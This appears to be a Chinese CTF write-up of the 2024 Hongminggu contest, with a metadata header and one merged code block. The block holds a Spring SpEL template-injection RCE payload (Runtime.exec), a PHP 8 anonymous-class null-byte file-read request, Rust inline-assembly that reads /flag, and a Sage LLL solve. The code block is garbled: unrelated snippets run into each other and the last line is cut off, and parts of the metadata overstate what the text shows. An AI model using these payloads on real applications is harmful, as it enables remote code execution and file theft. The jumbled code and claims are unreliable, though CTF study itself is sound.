---
title: 2024 第四届红明谷 WriteUp By Mini-Venom（PHP 8 anonymous class + Spring SpEL + Rust 内联汇编）
contest: 2024 第四届红明谷
year: 2024
difficulty: medium
vuln_type:
- rce
- ssti
- web_unknown
- pwn_unknown
tags:
- 红明谷 chips 线性变换 LLL
- PHP Basic auth admin/2e525e29e465f45d8d7c56319fe73036
- Spring SpEL T(java.lang.Boolean).forName
- T(Runtime).getRuntime().exec('calc')
- class@anonymous 0x00 截断
- ezphpPhp8 路由
- SpringTemplateEngine.process
- Rust 内联汇编 sys_open+sys_read+sys_write ORW
attack_chain:
- 'PHP 鉴权: $_SERVER[''PHP_AUTH_USER''] 校验 admin/2e525e29e465f45d8d7c56319fe73036'
- 'Spring SpEL: [[${T(java.lang.Boolean).forName("com.fasterxml.jackson.databind.ObjectMapper").newInstance().readValue("{}",...SpelExpressionParser).parseExpression("T(Runtime).getRuntime().exec(''calc'')").getValue()}]]'
- /flag.php?ezphpPhp8=ko1sh1 trigger highlight_file
- class@anonymous\x00/var/www/html/flag.php:7$0 文件名截断 + dump 调试
- 'Rust inline asm: sys_open("/flag\0", O_RDONLY) → sys_read(fd, buf) → sys_write(1, buf)'
- crypto chips 线性变换 → 对 S 求 LLL
key_payload: 'Spring SpEL: T(Runtime).getRuntime().exec(''calc'')'
one_liner: 红明谷 Mini-Venom 综合：PHP Basic 鉴权 + Spring SpEL RCE + PHP 8 anonymous class 文件名 0x00 截断 + Rust 内联汇编 ORW + chips LLL。
lesson: Spring SpEL 注入通过 `[[${...}]]` 触发，`T(Class).forName` 反射调用是经典 payload；PHP 8 class@anonymous 0x00 截断是高版本 PHP 调试输出文件名的常用技巧；Rust core::arch::asm! 内联汇编做 ORW 是 2024 新趋势。
quality: high
full_path: 2024第四届红明谷_WriteUp_By_Mini-Venom.full.md
meta_path: 2024第四届红明谷_WriteUp_By_Mini-Venom.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 2024 第四届红明谷 WriteUp By Mini-Venom（PHP 8 anonymous class + Spring SpEL + Rust 内联汇编）。红明谷 Mini-Venom 综合：PHP Basic 鉴权 + Spring SpEL RCE + PHP 8 anonymous class 文件名 0x00 截断 + Rust 内联汇编 ORW + chips LLL。。...
category: web
subcategory: rce
subcategories:
- rce
- ssti
- web_other
- pwn_other
tools_used:
- PHP
- Rust
- Spring
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/172270.html
reasoning_chain:
- '[触发点] 题目给 SpringTemplateEngine.process(hostname, context) + [[${...}]] → 假设：Spring SpEL 注入 → [动作] payload = [[${T(Runtime).getRuntime().exec(''calc'')}]] → [观察] RCE 成功 → [下一步] Java 反射链'
- '[触发点] PHP Basic 鉴权 + class@anonymous 0x00 截断 → 假设：PHP 8 调试输出文件名截断 → [动作] GET /flag.php?ezphpPhp8=class@anonymous\x00/var/www/html/flag.php:7$0 → [观察] 读取 flag.php 源码 → [下一步] 找漏洞'
- '[触发点] Rust 题目 main 函数 core::arch::asm! 内联汇编 → 假设：ORW（open/read/write）三连 → [动作] 直接读出 syscall 2/0/1 + /flag 文件名 → [观察] 拿到 flag → [下一步] chips LLL 还原'
- '[触发点] pickle 信号处理 + chips 矩阵 → 假设：LLL 还原 chips → [动作] signals_matrix.LLL()[-11:-1] → [观察] M_T = chips * signals_matrix.T → [下一步] 还原每行 bit → flag'
- '[触发点] chips 信号 chips 矩阵 + pickle 信号处理 → 假设：pickle 模块解析 chips 状态 → [动作] sage chips * signals_matrix.T + LLL → [观察] 还原 11 bit 稀疏向量'
failed_attempts:
- 试图用 Spring 常规 SpEL 注入 → 失败：必须 [[${...}]] 双层括号触发
- 试图直接拼 file_get_contents 路径 → 失败：class@anonymous\x00 截断才生效
- 试图解 Rust 字符串里的 ORW 汇编 → 失败：必须看出是直接 sys_open/sys_read/sys_write 三连
key_observations:
- Spring SpEL 注入通过 `[[${...}]]` 触发，`T(Class).forName` 反射调用是经典 payload
- PHP 8 class@anonymous 0x00 截断是高版本 PHP 调试输出文件名的常用技巧
- Rust core::arch::asm! 内联汇编做 ORW 是 2024 新趋势
- pickle + signal chips + LLL 矩阵是 Sage 还原稀疏向量的经典路径
prerequisites:
- Spring SpEL 注入（[[${...}]]）
- PHP 8 类名 0x00 截断
- Rust 内联汇编 ORW 模式
- Sage LLL 矩阵算法
---
# 2024第四届红明谷 WriteUp By Mini-Venom

> 原文: https://www.ctfiot.com/172270.html
> ID: 172270

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组

于是 S 就可以看作是由 chips 线性变换而来，并且 chips 只有 1 和 -1，于是直接对 S 求一个LLL


```
<?php
if (!isset($_SERVER['PHP_AUTH_USER'])) {
    header('WWW-Authenticate: Basic realm="Restricted Area"');
    header('HTTP/1.0 401 Unauthorized');
    echo '小明是运维工程师，最近网站老是出现bug。';
    exit;
} else {
    $validUser = 'admin';
    $validPass = '2e525e29e465f45d8d7c56319fe73036';
<!--?php
Context context = new Context();
SpringTemplateEngine engine = new SpringTemplateEngine();
return engine.process(hostname, (IContext)context);
[[${T(java.lang.Boolean).forName("com.fasterxml.jackson.databind.ObjectMapper").newInstance().readValue("{}",T(java.lang.Boolean).forName("org.springframework.expression.spel.standard.SpelExpressionParser")).parseExpression("T(Runtime).getRuntime().exec('calc')").getValue()}]]
/flag.php?ezphpPhp8=ko1sh1
<?php
if (isset($_GET['ezphpPhp8'])) {
    highlight_file(__FILE__);
} else {
    die("No");
}
$a = new class {
    function __construct()
    {
    }
GET /flag.php?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0 HTTP/1.1
Host: eci-2zef6aoe4x8c78fobzdc.cloudeci1.ichunqiu.com
Connection: keep-alive
sec-ch-ua: "Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: chkphone=acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; Hm_lvt_2d0601bd28de7d49818249cf35d95943=1711431296,1711937711,1712027510
fn main() {
    let mut buf = [0u8; 1024];
    let filename = "/flag\0";
    let fd: i32;
    let count: usize;
    unsafe {
        // open 系统调用
        core::
arch::
asm!(
            "syscall",
            in("rax") 2, // sys_open
            in("rdi") filename.as_ptr(),
            in("rsi") 0, // flags (O_RDONLY)
            lateout("rax") fd,
        );
        // 检查文件描述符是否有效
        if fd >= 0 {
            // read 系统调用
            core::
arch::
asm!(
                "syscall",
                in("rax") 0, // sys_read
                in("rdi") fd,
                in("rsi") buf.as_mut_ptr(),
                in("rdx") buf.len(),
                lateout("rax") count,
            );
            // write 系统调用，将读取的内容写到标准输出
            core::
arch::
asm!(
                "syscall",
                in("rax") 1, // sys_write
                in("rdi") 1, //
                in("rsi") buf.as_ptr(),
                in("rdx") count,
            );
        }
    }
}
with open("output.pkl", "rb") as file:
    signal = pickle.load(file)
single_signal_list = []
signals = []
signals_col = []
for i in range(0,len(signal)//1997):
    single_signal_list = signal[i*1997:(i+1)*1997]
    single_signal = round((sum(single_signal_list)/1997)*10)
    signals.append(single_signal)
    if len(signals) == 32:
        signals_col.append(signals)
        signals = [] 
signals_matrix = matrix(ZZ,signals_col)
chips = signals_matrix.LLL()[-11:-1]
M_T = chips * signals_matrix.T
for m in M_T:
    tag = m[0]
    flag=''.join(['0' if i == tag else '1' for i in m])
    print(int.to_bytes(int(flag,2),48,'
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]